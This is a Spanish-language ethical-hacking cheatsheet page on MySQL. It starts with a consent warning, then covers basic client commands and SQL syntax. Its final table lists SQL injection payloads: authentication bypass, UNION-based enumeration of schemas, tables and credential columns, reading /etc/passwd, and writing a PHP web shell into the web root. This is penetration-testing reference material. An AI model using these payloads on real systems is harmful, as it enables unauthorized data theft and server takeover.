
# MySQL

{% hint style="danger" %}
**Nota:** Este tipo de búsquedas son muy invasivas, ya que vamos a comprometer la base de datos del objetivo, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">**Conexión a MySQL por terminal:**</mark>

#### Conectar a la base de datos MySQL:

```bash
mysql -u nombre_usuario -p
```

Reemplaza `nombre_usuario` con el nombre de usuario de MySQL. Al ejecutar este comando, se te pedirá que ingreses la contraseña del usuario.

## <mark style="color:purple;">**Comandos para extraer información:**</mark>

#### Mostrar todas las bases de datos:

```sql
SHOW DATABASES;
```

#### Seleccionar una base de datos

```sql
USE nombre_base_datos;
```

#### Mostrar todas las tablas en la base de datos seleccionada:

```sql
SHOW TABLES;
```

#### Mostrar la estructura de una tabla específica:

```sql
DESCRIBE nombre_tabla;
```

#### Extraer todos los datos de una tabla:

```sql
SELECT * FROM nombre_tabla;
```

#### Filtrar datos con una consulta SELECT (ejemplo):

```sql
SELECT columna1, columna2 FROM nombre_tabla WHERE condición;
```

#### Exportar resultados de una consulta SELECT a un archivo CSV:

```sql
SELECT columna1, columna2 INTO OUTFILE '/ruta/al/archivo.csv' FIELDS TERMINATED BY ',' FROM nombre_tabla;
```

#### Salir del cliente de MySQL:

```sql
EXIT;
```

#### Cerrar la conexión sin salir del cliente:

```sql
QUIT;
```

## <mark style="color:purple;">Cheatsheet</mark>

### MySQL

<table data-header-hidden><thead><tr><th width="396"></th><th></th></tr></thead><tbody><tr><td><strong>Comandos</strong></td><td><strong>Descripción</strong></td></tr><tr><td><mark style="color:purple;"><strong>General</strong></mark></td><td></td></tr><tr><td><code>mysql -u root -h docker.server.eu -P 3306 -p</code></td><td>Login en la base de datos mysql</td></tr><tr><td><code>SHOW DATABASES</code></td><td>Mostrar todas las bases de datos</td></tr><tr><td><code>USE users</code></td><td>Usar una base de datos</td></tr><tr><td><mark style="color:purple;"><strong>Tablas</strong></mark></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>Añadir una nueva</td></tr><tr><td><code>SHOW TABLES</code></td><td>Mostrar todas las tablas</td></tr><tr><td><code>DESCRIBE logins</code></td><td>Mostrar las propiedades de una tabla</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>Añade valores a una tabla</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>Agregar valores a columnas específicas en una tabla</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &#x3C;condition></code></td><td>Actualizar valores de la tabla</td></tr><tr><td><mark style="color:purple;"><strong>Columnas</strong></mark></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>Mostrar todas las columnas de una tabla</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>Mostrar columnas específicas en una tabla</td></tr><tr><td><code>DROP TABLE logins</code></td><td>Borrar una tabla</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>Añadir nueva columna</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>Renombrar columna</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>Cambiar tipo de datos de columna</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>Borrar una columna</td></tr><tr><td><mark style="color:purple;"><strong>Output</strong></mark></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>Ordenar por columna</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>Ordenar por columna descendente</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>Ordenar por dos columnas</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>Mostrar solo los dos primeros resultados</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>Mostrar solo los dos primeros resultados a partir del índice 2</td></tr><tr><td><code>SELECT * FROM table_name WHERE &#x3C;condition></code></td><td>Enumerar resultados que cumplen una condición</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td><td>Listar resultados donde el nombre es similar a una cadena determinada</td></tr></tbody></table>

### <mark style="color:purple;">Operadores en MySQL</mark>

* División (`/`), Multiplicación (`*`), y Modulos (`%`)
* Adición (`+`) and Sustracción (`-`)
* Comparación (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

### <mark style="color:purple;">SQL Injection</mark>

{% content-ref url="/pages/lIoNr7ttmkn5RkFA9FXK" %}
[SQL Injection](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/sql-injection.md)
{% endcontent-ref %}

<table data-header-hidden><thead><tr><th width="384"></th><th></th></tr></thead><tbody><tr><td><strong>Payload</strong></td><td><strong>Descripción</strong></td></tr><tr><td><mark style="color:purple;"><strong>Auth Bypass</strong></mark></td><td></td></tr><tr><td><code>admin' or '1'='1</code></td><td>Omisión de autenticación básica</td></tr><tr><td><code>admin')-- -</code></td><td>Omisión de autenticación básica con comentarios</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><mark style="color:purple;"><strong>Union Injection</strong></mark></td><td></td></tr><tr><td><code>' order by 1-- -</code></td><td>Detectar el número de columnas usando <code>order by</code></td></tr><tr><td><code>cn' UNION select 1,2,3-- -</code></td><td>Detectar el número de columnas usando <code>Union injection</code></td></tr><tr><td><code>cn' UNION select 1,@@version,3,4-- -</code></td><td>Union injection básico</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>Union injection para 4 columnas</td></tr><tr><td><mark style="color:purple;"><strong>DB Enumeration</strong></mark></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>Fingerprint MySQL con query output</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Fingerprint MySQL sin output</td></tr><tr><td><code>cn' UNION select 1,database(),2,3-- -</code></td><td>Nombre de la base de datos actual</td></tr><tr><td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>Listar todas las bases de datos</td></tr><tr><td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td><td>Enumerar todas las tablas en una base de datos específica</td></tr><tr><td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td><td>Enumerar todas las columnas de una tabla específica</td></tr><tr><td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>Volcar datos de una tabla en otra base de datos</td></tr><tr><td><mark style="color:purple;"><strong>Privileges</strong></mark></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td><td>Encontrar usuario actual</td></tr><tr><td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td><td>Encuentra si el usuario tiene privilegios de administrador</td></tr><tr><td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -</code></td><td>Busca todos los usuarios con privilegios</td></tr><tr><td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td><td>Encontrar a qué directorios se puede acceder a través de MySQL</td></tr><tr><td><mark style="color:purple;"><strong>File Injection</strong></mark></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td><td>Leer archivo local</td></tr><tr><td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td><td>Escribir una cadena en un archivo local</td></tr><tr><td><code>cn' union select "",'&#x3C;?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -</code></td><td>Escriba un shell web en el directorio web base</td></tr></tbody></table>
